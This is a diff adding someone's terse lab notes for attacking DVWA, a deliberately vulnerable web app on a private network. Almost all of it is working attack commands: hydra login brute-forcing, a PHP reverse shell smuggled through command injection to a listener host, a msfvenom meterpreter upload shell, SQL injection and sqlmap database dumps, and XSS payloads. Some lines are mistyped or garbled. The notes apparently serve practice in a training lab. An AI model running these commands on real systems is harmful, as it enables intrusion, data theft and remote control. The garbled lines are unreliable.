@@ -121,3 +121,126 @@
 ```
 
 </details>
+
+<details>
+<summary>DVWA</summary>
+
+```conose
+hydra -l admin -p pasword 10.0.0.49 http-post-form="/login.php:username=admin&password=^PASS^&Login=Submit:Login failed"
+
+hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -l admin -p password
+
+NOT WORKING
+hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Login failed" -l admin -P /home/sbkali/Downloads/pass.txt
+
+1. Vul - Brute-force 
+security=low
+hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt
+
+security=medium
+hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=medium:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt -V -I --> verbose
+
+security=high
+NOT WORKING
+------------------------------------------------------------------------------------------------------------------------
+Command Injection
+
+check which char is accepting ;/&/|/||/&&
+
+low
+localhost
+localhost | whoami
+localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+nc -nvlp 4444
+
+medium
+
+localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+high
+change secrity by intercepting then it will work
+------------------------------------------------------------------------------------------------------------------------
+File upload
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.16 LPORT=444 -f raw > shell.php
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.0.0.16
+set LPORT 444
+exploit
+
+1. update Content-Type: image/jpeg 
+
+Upload shell.php -> File is uploaded
+Now access that file by entering the full path 10.0.0.49/hackable/uploads/../../hackable/uploads/shell.php
+
+Reverse shell is open in msfconsole
+sysinfo
+whoami
+pwd
+
+High
+add GIG 98 to shell.php
+mv shell.php shell.php.jpeg
+Similary intercept the req and update the security it will work for all. if only jpeg accepted then intercept and update Content-Type: image/jpeg -
+------------------------------------------------------------------------------------------------------------------------
+' or 1=1#   - Displays result
+
+Find no of columns --> 2
+' order by 1# - No error
+' order by 1# - No error
+' order by 3# -- error
+
+' union select @@version, null#  --> 10.1.26-MariaDB-0+deb9u1
+' or 0=0 union select null, user() #
+' or 0=0 union select null,concat(user, password) from users #
+
+First name: admin
+Surname: admin
+
+SQLMAP
+
+1. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+2. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch --dump-all
+
+Blind Injection
+' or sleep(5)#
+1 or sleep(5)#
+
+1 1=0 and union select null, concat(user,password) from users #
+-------------------------------------------------------------------------------------------------------------
+XSS-DOM
+alert(1)
+Medium: </select><video><source onerror="javascript:alert(1)"></video>
+High: #<script>alert(1)</script>  --> commented javascript
+
+Reflected
+
+Low: <script>alert(1)</script>
+Medium : <img src=x onerror=alert(1)>
+High: <img src=x onerror=alert(1)>
+
+Stored
+low: <script>alert(1)</script>
+medium: <img src=x onerror=alert(1)>
+high: <img src=x onerror=alert(1)>
+-------------------------------
+echo -n "token" | wc -c --> 32
+echo 'ChangeMe' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
+PunatrZr
+echo -n "PunatrZr"| md5sum  -> same token 
+
+echo 'success' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
+dsfsdf
+echo -n "dsfsdf"| md5sum  -> diff token
+
+put success and add diff token in burpsuit
+
+```
+</details>
